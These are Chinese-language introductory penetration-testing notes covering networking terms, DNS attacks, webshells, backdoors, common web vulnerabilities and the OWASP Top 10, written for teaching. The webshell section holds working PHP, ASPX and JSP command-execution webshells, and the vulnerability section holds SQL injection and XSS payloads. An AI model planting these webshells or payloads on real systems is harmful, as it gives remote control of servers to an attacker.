# 01.名词介绍

## 1.渗透测试

### 1.1 定义
- 什么是**渗透测试**？
- **渗透测试（Penetration Testing，简称 PenTest）**  
  是一种通过模拟黑客攻击的方式，评估系统、网络、应用程序等是否存在安全漏洞的方法。  
- 目的：在攻击者发现问题之前，帮助企业发现并修复潜在安全风险。  

---

### 1.2 意义
- **发现风险**：提前识别系统和应用的安全漏洞。  
- **提升安全意识**：让企业了解自身安全防护的薄弱环节。  
- **合规要求**：满足金融、政府、医疗等行业的安全审计与合规标准。  
- **实战演练**：帮助企业构建“攻防演练”能力，提升整体安全水平。  

---

### 1.3 渗透基本流程
1. **信息收集**  
   - 收集目标的域名、IP、开放端口、运行服务等信息。  
2. **漏洞探测**  
   - 使用自动化工具和手工方法发现漏洞（如 SQL 注入、弱口令）。  
3. **漏洞利用**  
   - 尝试利用漏洞进入系统（如获取 Shell）。  
4. **权限提升**  
   - 将低权限用户提升为系统管理员或域管理员。  
5. **内网横向渗透**  
   - 扩大战果，攻破更多主机或服务。  
6. **渗透测试报告**  
   - 记录渗透路径、漏洞详情，形成报告供修复。  

---

### 1.4 就业方向
- **甲方企业安全工程师**  
  - 负责企业内网安全、渗透测试、红蓝对抗演练。  
- **乙方安全服务工程师（安服）**  
  - 为客户提供安全评估、渗透测试、攻防演练服务。  
- **安全研究员 / 漏洞挖掘**  
  - 专注于挖掘新型漏洞，提交漏洞平台或安全厂商。  
- **红队成员**  
  - 专门从事攻防演练，模拟黑客攻击对抗蓝队防御。  

---

### 1.5 大概薪资范围
- **初级渗透测试工程师**：8k ~ 15k / 月  
- **中级渗透测试工程师**：15k ~ 20k / 月  
- **高级/红队成员**：20k ~ 50k / 月  
- **顶尖安全专家 / Team Leader**：年薪百万以上  

> 注：一线城市（北上广深杭）的薪资水平通常高于二三线城市。  

---

### 1.6 国内就业企业
- **大型互联网公司**  
  - 阿里巴巴、腾讯、字节跳动、美团、京东  
- **金融机构**  
  - 工行、建行、招行、平安银行等  
- **安全厂商**  
  - 长亭科技、奇安信、安恒信息、绿盟科技、知道创宇、默安科技  
- **其他方向**  
  - 各类创业公司、云计算公司（华为云、阿里云）、安全研究实验室  

## 2.域名相关

### 2.1 物理地址
- 又称 **MAC 地址**（Media Access Control Address）。  
- 是网卡的唯一标识符，由厂商烧录在硬件中，通常为 48 位（12 个十六进制数）。  
- 用途：局域网中设备识别与通信。  

**Windows查看mac地址**：

- 在开始菜单或搜索栏中输入 `cmd`，然后按回车键打开命令提示符。
- 在命令提示符窗口中输入 `ipconfig /all`，然后按回车键。
- 在显示的结果中，找到你正在使用的网络，其下方的“物理地址”就是 MAC 地址。

![image-20250908112650820](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908112650820.png)

---

### 2.2 IP地址

- **IP 地址（Internet Protocol Address）** 是设备在网络中的逻辑地址。  
- 分类：
  - IPv4：32 位，常见格式如 `192.168.1.1`。  
  - IPv6：128 位，更大地址空间，格式如 `2001:0db8:85a3::8a2e:0370:7334`。  
- 用途：在网络中定位和标识设备。  

**Windows查看IP地址**：

- 在开始菜单或搜索栏中输入 `cmd`，然后按回车键打开命令提示符。
- 在命令提示符窗口中输入 `ipconfig /all`，然后按回车键。
- 在显示的结果中，找到你正在使用的网络，其下方的“IPv4地址”就是 IP地址。

![image-20250908114117570](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908114117570.png)

---

### 2.3 域名
- **域名（Domain Name）** 是 IP 地址的易记替代。  
- 例如：`www.example.com` 对应某个 IP 地址。  
- 优势：比数字 IP 更易于记忆和使用。  

**ping百度看看**

![image-20250908114314082](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908114314082.png)

---

### 2.4 域名解析
- 将 **域名转换为 IP 地址** 的过程，称为 **DNS 解析**。  
- 例：访问 `www.baidu.com` 时，系统会向 DNS 服务器查询对应的 IP 地址。  

---

### 2.5 域名服务器 (DNS)
- **DNS（Domain Name System）服务器**：负责存储和解析域名与 IP 地址的对应关系。  
- 分类：
  - 根域名服务器  
  - 顶级域名服务器（.com、.org 等）  
  - 权威域名服务器（保存某个域的最终记录）  
  - 递归解析服务器（运营商提供）  

---

### 2.6 域名级别
- **顶级域名（TLD）**：如 `.com`、`.cn`、`.org`。  
- **二级域名**：如 `example.com`。  
- **三级域名**：如 `www.example.com`。  
- **子域名**：如 `mail.example.com`。  

---

### 2.7 域名注册
- 用户可以通过域名注册商（如阿里云、腾讯云、GoDaddy）注册域名。  
- 注册需要：
  - 唯一性（不能与已注册域名重复）。  
  - 按年付费，注册到期需续费。  

---

### 2.8 域名对于渗透的意义
- **信息收集的入口**：渗透测试中，域名往往是攻击目标的第一步。  
- 通过域名可获取：
  - **IP 地址**（定位服务器）。  
  - **子域名**（发现更多攻击入口）。  
  - **注册信息（WHOIS）**（获取企业联系信息）。  
- 有助于推测企业的业务架构和潜在漏洞。  

whois查询

![image-20250908114934400](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908114934400.png)

备案查询

![image-20250908115151027](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908115151027.png)

IP反查域名（可查看域名历史绑定IP，概率实现绕CDN或者云WAF）

![image-20250908115608633](/Users/s1tuk1n9/Documents/项目开发/eagles-lab/Security-Notes/信息打点/01.名词介绍/image-20250908115608633.png)

---

### 2.9 Hosts 文件
- 本地系统的 `hosts` 文件：  
  - 用于手工设置域名与 IP 的对应关系。  
  - 优先级高于 DNS。  
- 典型路径：
  - Windows: `C:\Windows\System32\drivers\etc\hosts`  
  - Linux: `/etc/hosts`  

---

### 2.10 CDN
- **CDN（内容分发网络）**：将网站内容缓存到多个节点，提高访问速度和稳定性。  
- 优势：加快访问、抗攻击。  
- 对渗透的影响：
  - 使用 CDN 后，真实服务器 IP 会被隐藏，增加信息收集难度。  

---

### 2.11 针对 DNS 的攻击
1. **DNS 劫持**  
   - 攻击者篡改 DNS 解析结果，将用户引导至恶意网站。  
2. **DNS 缓存投毒**  
   - 在递归解析器缓存中注入虚假记录，导致用户解析到错误的 IP。  
3. **域传送漏洞 (Zone Transfer)**  
   - 攻击者可获取整个域的子域名和记录信息。  
   - 漏洞详解：域名系统（DNS）的**域传送**（Zone Transfer）功能，原本是为了在主 DNS 服务器和备份 DNS 服务器之间同步数据而设计的。正常情况下，主服务器只会允许特定的、预先配置好的备份服务器进行域传送。当管理员没有正确限制这一功能时，任何客户端都可以向主 DNS 服务器发起域传送请求，从而获取该域名下的所有 DNS 记录。
4. **子域名爆破**  
   - 枚举域名下的子域，发现隐藏业务入口。  
5. **DNS 隧道 (DNS Tunneling)**  
   - 利用 DNS 协议传输数据，绕过防火墙实现隐蔽通信。  

## 3.编程相关

### 3.1 Shell 简介
- **Shell 定义**  
  - Shell 是操作系统的命令解释器，用户通过 Shell 输入命令，操作系统执行并返回结果。  
  - 常见的 Shell 类型：
    - **Linux/Unix Shell**：如 `bash`、`sh`、`zsh`。  
    - **Windows Shell**：如 `cmd.exe`、PowerShell。  

- **在安全中的作用**  
  - 正常用途：系统管理、批量任务处理。  
  - 攻击用途：一旦获得 Shell 权限，攻击者可直接控制目标系统。  

---

### 3.2 WebShell
- **定义**  
  WebShell 是一种运行在 Web 服务器上的恶意脚本文件，攻击者通过浏览器远程操作服务器。  

- **常见形式**  
  - **一句话木马（PHP）**  
    
    ```php
    <?php @eval($_POST['cmd']); ?>
    ```
    - 攻击者通过 POST 请求传递命令，服务器执行并返回结果。  
    
  - **ASP/ASPX WebShell**（适用于 Windows IIS）。  
  
    ```c#
    <%@ Page Language="C#" %>
    <%
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + Request["cmd"];
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        string output = proc.StandardOutput.ReadToEnd();
        Response.Write(output);
    %>
    ```
  
    - 说明：攻击者访问 `http://target.com/shell.aspx?cmd=whoami`，服务器执行命令并返回结果。
  
  - **JSP WebShell**（适用于 Java Web 应用）。  
  
    ```jsp
    <%
        String cmd = request.getParameter("cmd");
        if(cmd != null){
            String output = "";
            try{
                Process p = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream())
                );
                String line;
                while((line = reader.readLine()) != null){
                    output += line + "\n";
                }
            }catch(Exception e){
                output = e.toString();
            }
            out.println(output);
        }
    %>
    ```
  
    - 说明：
      - 攻击者访问 `http://target.com/shell.jsp?cmd=whoami`，即可远程执行系统命令。
  
- **典型功能**  
  
  - 文件管理：上传、下载、修改、删除。  
  - 数据库操作：执行 SQL 查询、导出数据。  
  - 命令执行：直接调用系统命令。  
  - 权限维持：创建隐藏账户或服务。  

---

### 3.3 WebShell 获取方式
- **文件上传漏洞**：上传 `.php` 或 `.jsp` 文件作为后门。  
- **代码注入漏洞**：通过 SQL 注入写入 WebShell 文件。  
- **弱口令后台**：上传恶意插件或脚本。  
- **远程文件包含 (RFI)**：加载远程的恶意脚本。  

---

### 3.4常用的 WebShell 管理工具

##### 3.4.1 中国菜刀 (China Chopper)

- **特点**  
  
  - 体积小（几十 KB）。  
  - 支持 ASP、ASPX、PHP、JSP 等多种 WebShell。  
  - 界面简洁，功能齐全。  
- **功能**  
  
  - 文件管理、数据库管理。  
  - 命令执行。  
  - 反弹 Shell。  
- **应用场景**  
  
  - 最经典、最广泛使用的 WebShell 管理工具之一。  
  
---

##### 3.4.2 中国蚁剑 (AntSword)

- **特点**  
  - 开源、跨平台（基于 Node.js）。  
  - 插件丰富，支持自定义脚本。  
  - 活跃的社区更新。  
- **功能**  
  - 文件管理、数据库管理。  
  - 命令执行、虚拟终端。  
  - 内存马管理（高级）。  
- **应用场景**  
  - 适用于现代渗透测试，功能比菜刀更全面。  

---

##### 3.4.3 冰蝎 (Behinder)

- **特点**  
  - 面向 Java Web 应用的高级 WebShell 管理工具。  
  - 使用 **加密通信**，绕过安全设备检测。  
  - 支持 JSP、ASP.NET、PHP。  
- **功能**  
  - 虚拟内存 Shell（内存马）。  
  - 命令执行、数据库管理。  
  - 反弹 Shell。  
- **应用场景**  
  - 针对部署 Java 应用服务器（Tomcat、WebLogic）的场景。  

---

##### 3.4.4  哥斯拉 (Godzilla)

- **特点**  
  - 冰蝎的升级版，支持更多语言（JSP、ASP.NET、PHP、Go）。  
  - 通信流量加密与混淆，抗检测能力强。  
  - 支持自动化持久化控制。  
- **功能**  
  - 内存马注入。  
  - 多种通信加密算法（AES、RC4）。  
  - 插件化扩展。  
- **应用场景**  
  - 高级渗透测试与持久化控制。  

---

##### 3.4.5 Weevely

- **特点**  
  - 基于 Python 的 WebShell 管理工具。  
  - WebShell 文件本身非常小巧（仅几行代码）。  
  - 开源、可扩展模块。  
  - kali自带
- **功能**  
  - 文件管理。  
  - 命令执行。  
  - 模块化扩展（如端口扫描、反弹 Shell）。  
- **应用场景**  
  - 偏向红队测试和自动化渗透。  

---

##### 工具对比表

| 工具    | 语言支持            | 通信加密 | 插件/扩展 | 主要特点                 |
| ------- | ------------------- | -------- | --------- | ------------------------ |
| 菜刀    | ASP, ASPX, PHP, JSP | 无       | 少        | 经典轻量，功能基础全面   |
| 蚁剑    | ASP, ASPX, PHP, JSP | 可定制   | 丰富      | 开源，跨平台，插件生态好 |
| 冰蝎    | JSP, ASPX, PHP      | 有       | 一般      | 加密通信，内存马支持     |
| 哥斯拉  | JSP, ASPX, PHP, Go  | 有       | 较多      | 高级加密，抗检测能力强   |
| Weevely | PHP                 | 有       | 模块化    | Python 管理端，小巧隐蔽  |

### 3.5 后门

- **定义**  
  后门是攻击者在目标系统中留下的隐蔽入口，以便下次无需重新利用漏洞即可进入。  

- **WebShell 与后门的关系**  
  - WebShell 可以看作是一种 **Web 后门**。  
  - 攻击者常用 WebShell 初步控制系统，再植入更隐蔽的后门（如 Rootkit、木马）。  

---

### 3.6 后门的作用
1. **维持持久化访问**：保证长期控制目标服务器。  
2. **权限维持与提升**：通过后门继续尝试提权。  
3. **隐蔽性**：比普通 Shell 更难被发现。  
4. **跳板功能**：利用已控服务器攻击内网其他系统。  

---

### 3.7 后门进阶
- **免杀与混淆**  
  - 使用编码、加密绕过杀毒软件。  
  - 将 WebShell 伪装成正常业务脚本。  

- **内存马 (Memory Shell)**  
  - 直接注入到应用服务器的内存中（Tomcat、Weblogic 常见）。  
  - 文件系统中没有痕迹，检测难度高。  

- **隐蔽通信**  
  - 使用 HTTPS、DNS 隧道进行通信，避免明文流量暴露。  
  - 借助正常业务流量（如 WebSocket、API 请求）隐藏后门通信。  

## 4.网站相关

### 4.1 网站的基本组成

1. **前端 (Front-end)**  
   - 用户可见的部分，包括网页的结构、样式和交互功能。  
   - 常见技术：  
     - HTML（页面结构）  
     - CSS（页面样式）  
     - JavaScript（交互逻辑）  

2. **后端 (Back-end)**  
   - 处理业务逻辑、数据存储和用户请求的部分。  
   - 常见技术：  
     - PHP、Python、Java、.NET、Node.js  
     - 数据库：MySQL、PostgreSQL、MongoDB  

3. **服务器与中间件**  
   - 运行网站的硬件和软件环境。  
   - 常见组件：  
     - Web 服务器：Apache、Nginx、IIS  
     - 应用服务器：Tomcat、WebLogic  
     - 缓存：Redis、Memcached  

4. **数据库 (Database)**  
   - 存储和管理网站的数据，如用户信息、文章内容。  
   - 常见数据库：MySQL、Oracle、MongoDB。  

---

### 4.2 针对网站结构的测试

1. **信息收集**  
   - 获取网站的域名、IP 地址、端口。  
   - 探测目录和文件（如 `/admin`、`/uploads`）。  
   - 使用工具：`nmap`、`dirb`、`gobuster`。  

2. **网站指纹识别**  
   - 判断网站使用的 CMS、框架和语言。  
   - 工具：`whatweb`、`wappalyzer`。  

3. **功能测试**  
   - 逐一分析网站的功能模块（注册、登录、搜索、上传等）。  
   - 重点关注数据输入点和交互功能。  

4. **安全测试**  
   - 使用漏洞扫描工具（如 AWVS、Burp Suite）发现潜在漏洞。  
   - 手工测试输入点是否存在异常。  

---

### 4.3常见 Web 漏洞

1. **SQL 注入 (SQL Injection)**  
   
   - 攻击者通过输入恶意 SQL 语句操作数据库。  
   - 危害：数据泄露、篡改、提权。  
   - 示例：  
     ```sql
     输入用户名: admin' OR '1'='1
     ```
   
2. **跨站脚本 (XSS)**  
   - 在网页中注入恶意 JavaScript 脚本。  
   - 危害：窃取 Cookie、会话劫持、钓鱼攻击。  
   - 示例：  
     ```html
     <script>alert('XSS')</script>
     ```

3. **文件上传漏洞**  
   - 未严格限制上传文件类型，攻击者上传 WebShell。  
   - 危害：服务器被远程控制。  

4. **命令执行 (RCE)**  
   - 服务器端执行了用户输入的系统命令。  
   - 危害：服务器完全被接管。  

5. **文件包含 (LFI/RFI)**  
   
   - 本地文件包含 (LFI)：攻击者读取系统敏感文件。  
   - 远程文件包含 (RFI)：加载远程恶意代码。  
   
6. **跨站请求伪造 (CSRF)**  
   - 诱骗用户在已登录状态下，执行攻击者构造的请求。  
   - 危害：修改密码、转账、删除数据。  

7. **弱口令/认证绕过**  
   - 管理员设置弱密码或认证逻辑存在漏洞。  
   - 危害：直接进入后台管理系统。  

8. **敏感信息泄露**  
   - 网站源代码、备份文件、日志文件未妥善保护。  
   - 危害：泄露数据库密码、配置文件等敏感信息。  

## 5. 漏洞相关

### 5.1 漏洞定义
- **什么是漏洞** ？ 
  漏洞是软件、系统或应用中的设计缺陷或实现问题，可能被攻击者利用，导致安全风险。  
- **漏洞类型**  
  - 代码漏洞（如 SQL 注入、缓冲区溢出）。  
  - 配置漏洞（如默认口令、目录遍历）。  
  - 逻辑漏洞（如支付绕过、权限越权）。  

---

### 5.2 EXP / POC 安全漏洞
- **POC（Proof of Concept）**  
  - 中文：概念验证。  
  - 作用：验证漏洞是否存在。  
  - 特点：通常不具备破坏性。  
  - 示例：提交特殊参数触发 SQL 报错。  

- **EXP（Exploit）**  
  - 中文：漏洞利用程序。  
  - 作用：直接利用漏洞获取权限或破坏系统。  
  - 特点：具备攻击性和实用性。  
  - 示例：通过漏洞上传 WebShell，控制服务器。  

---

### 5.3 漏洞管理
- **漏洞生命周期**  
  1. 发现（研究员、安全厂商、黑客）  
  2. 报告（CVE、CNVD、厂商）  
  3. 分析与验证  
  4. 修复与补丁发布  
  5. 验证修复效果  
  6. 持续监控  
- **漏洞管理流程**  
  - 信息收集：定期监控漏洞情报。  
  - 评估：根据 CVSS 打分判断漏洞风险等级。（CVSS（Common Vulnerability Scoring System）是一种国际通用的漏洞严重性评分标准，分数范围为 **0.0 - 10.0**。  主要由 **三大度量指标** 构成：**基本度量（Base Metrics）、时间度量（Temporal Metrics）、环境度量（Environmental Metrics）**）
  - 修复：及时更新补丁、调整配置。  
  - 验证：确认漏洞是否彻底修复。  

---

### 5.4 OWASP Top 10
OWASP（开放式 Web 应用安全项目）发布的 **Web 应用最严重的 10 类风险**，最经典版本为 **OWASP Top 10 - 2017**，被大量教材、培训和安全审计标准引用。  

#### A1: 注入（Injection）

- **定义**：攻击者将恶意数据作为命令或查询发送到解释器（如 SQL、OS 命令、LDAP、NoSQL）。  
- **典型案例**：SQL 注入、命令注入。  
- **防御**：使用参数化查询、预编译语句，避免拼接 SQL。  

#### A2: 身份认证失效（Broken Authentication）

- **定义**：应用程序未正确保护身份认证功能，导致攻击者可冒充合法用户。  
- **典型案例**：弱口令、会话固定、凭证暴力破解。  
- **防御**：使用强密码策略、多因素认证，合理的 Session 管理。  

#### A3: 敏感数据泄露（Sensitive Data Exposure）

- **定义**：敏感数据（密码、银行卡、隐私信息）在存储或传输中未得到保护。  
- **典型案例**：明文传输 HTTP、数据库明文存储密码。  
- **防御**：强制使用 HTTPS，数据加密存储，密钥管理。  

#### A4: XML 外部实体 (XXE)

- **定义**：不安全的 XML 解析器允许攻击者注入恶意的外部实体。  
- **典型案例**：读取服务器本地文件、SSRF、拒绝服务。  
- **防御**：禁用外部实体，使用安全的 XML 解析库。  

#### A5: 访问控制失效（Broken Access Control）

- **定义**：访问控制策略执行不当，导致用户访问不该访问的资源或功能。  
- **典型案例**：越权访问、水平/垂直权限绕过。  
- **防御**：强制服务器端访问控制，避免仅依赖前端。  

#### A6: 安全配置错误（Security Misconfiguration）

- **定义**：应用、框架、服务器配置错误，导致漏洞。  
- **典型案例**：未关闭调试模式、默认口令、暴露的管理接口。  
- **防御**：最小化安装、禁用不必要功能、统一配置管理。  

#### A7: 跨站脚本 (XSS, Cross-Site Scripting)

- **定义**：攻击者将恶意脚本注入网页，用户浏览时执行。  
- **典型案例**：反射型、存储型、DOM 型 XSS。  
- **防御**：输入输出过滤、CSP、安全编码。  

#### A8: 不安全的反序列化（Insecure Deserialization）

- **定义**：不安全的对象反序列化可能导致远程代码执行、注入、权限提升。  
- **典型案例**：Java、PHP 反序列化漏洞。  
- **防御**：避免反序列化不可信数据，使用安全格式（JSON）。  

#### A9: 使用含已知漏洞的组件（Using Components with Known Vulnerabilities）

- **定义**：使用带已知漏洞的开源库、框架或组件。  
- **典型案例**：Struts2 漏洞、过期的 jQuery。  
- **防御**：及时更新依赖库，使用漏洞扫描工具。  

#### A10: 不足的日志和监控（Insufficient Logging & Monitoring）

- **定义**：缺少安全日志与监控，导致攻击难以及时发现与响应。  
- **典型案例**：无入侵日志、无异常报警。  
- **防御**：记录关键操作日志，集成 SIEM，建立响应机制。  

---

### 5.5 漏洞扫描
- **定义**  
  自动化检测系统或网站漏洞的工具或方法。  

- **常用工具**  
  - **Web 漏洞扫描**：Xray、AWVS、AppScan、Burp Suite。  
  - **主机漏洞扫描**：Nessus、OpenVAS、Qualys。  
  - **综合安全平台**：长亭洞鉴、绿盟、启明星辰、360。  

- **优缺点**  
  - 优点：高效、覆盖面广。  
  - 缺点：可能存在漏报/误报，需人工验证。  

---

### 5.6 其他
- **零日漏洞 (0-Day)**  
  - 未公开、未修复的漏洞，危险性极高。  
- **漏洞赏金平台**  
  - HackerOne、Bugcrowd、漏洞盒子、补天平台。  
- **安全加固方法**  
  - 最小权限原则。  
  - 定期更新补丁。  
  - Web 应用防火墙 (WAF)。  
